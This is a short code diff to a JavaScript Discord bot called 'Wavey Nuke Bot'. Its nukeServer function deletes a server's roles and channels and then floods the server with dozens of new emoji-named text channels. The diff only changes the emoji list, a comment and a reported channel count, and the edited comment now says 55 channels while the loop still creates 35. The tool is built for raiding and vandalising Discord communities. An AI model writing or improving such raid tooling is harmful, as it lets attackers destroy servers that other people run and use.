@@ -9,7 +9,7 @@ const client = new Client({
     ]
 });
 
-const emojis = ['💀', '⚰️', '🦴', '🪦', '⚔️', '🗡️', '🔪', '🩸', '☠️', '👻'];
+const emojis = ['🌊', '💜', '🩷'];
 const discordLink = "https://discord.gg/XrTZWKgXca";
 
 client.on('ready', () => {
@@ -106,7 +106,7 @@ async function nukeServer(guild) {
         }
         await Promise.all(rolePromises);
         
-        // Create 35 text channels (no voice channels)
+        // Create 55 text channels (no voice channels)
         const channelPromises = [];
         for (let i = 0; i < 35; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
@@ -155,7 +155,7 @@ async function nukeServer(guild) {
                     { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                     { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
                     { name: '➕ Roles Created', value: '15', inline: true },
-                    { name: '➕ Channels Created', value: '55', inline: true }
+                    { name: '➕ Channels Created', value: '35', inline: true }
                 )
                 .setTimestamp()
                 .setFooter({ text: 'Wavey Nuke Bot' });
